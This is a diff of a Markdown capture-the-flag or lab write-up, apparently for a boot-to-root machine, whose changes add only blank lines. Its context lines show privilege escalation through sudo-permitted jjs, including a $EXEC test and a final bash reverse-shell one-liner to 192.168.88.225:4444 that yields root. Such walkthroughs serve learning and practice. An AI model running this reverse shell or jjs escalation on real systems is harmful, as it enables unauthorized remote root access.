@@ -174,6 +174,7 @@ Time to do privilege escalation!
 
 ### sudo -l
 ![sudo l](screenshots/sudo_l.png)
+
 I didn't know about jjs before...
 
 ### jjs
@@ -195,6 +196,7 @@ $EXEC(your_command_here)
 print($EXEC("whoami"))
 ```
 ![test script](screenshots/test_script.png)
+
 Yeah, it works.
 
 #### shell.js:
@@ -213,5 +215,6 @@ Final script:
 $EXEC("bash -c 'bash -i >& /dev/tcp/192.168.88.225/4444 0>&1'")
 ```
 ![root](screenshots/root.png)
+
 Now, we also have a root.txt.
 
